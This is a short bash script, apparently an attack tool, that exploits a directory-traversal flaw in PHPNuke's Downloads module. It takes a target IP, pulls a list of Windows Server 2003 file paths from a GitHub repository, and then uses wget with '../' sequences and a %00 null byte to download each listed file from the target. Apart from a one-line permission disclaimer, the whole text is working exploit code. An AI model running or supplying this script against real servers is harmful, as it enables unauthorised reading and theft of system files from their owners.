#!/bin/bash
#
# PHPNuke Directory Traversal looter
#
# Obtain list of Windows Server file from paste
#
# Use only only systems you have permission to use upon.
#
ip=$1
git clone https://github.com/dakkmaddy/phpnuke.git
cp phpnuke/w2k3* filelist.txt
#
declare -a outfile=$(awk -F "\\" '{print $NF}' filelist.txt)
for x in $(echo $outfile)
do
echo "Downloading $x"
wget -O $x "http://$ip/phpnuke/modules.php?name=Downloads&file=../../../../../../$x%00"
done
/bin/rm -r phpnuke

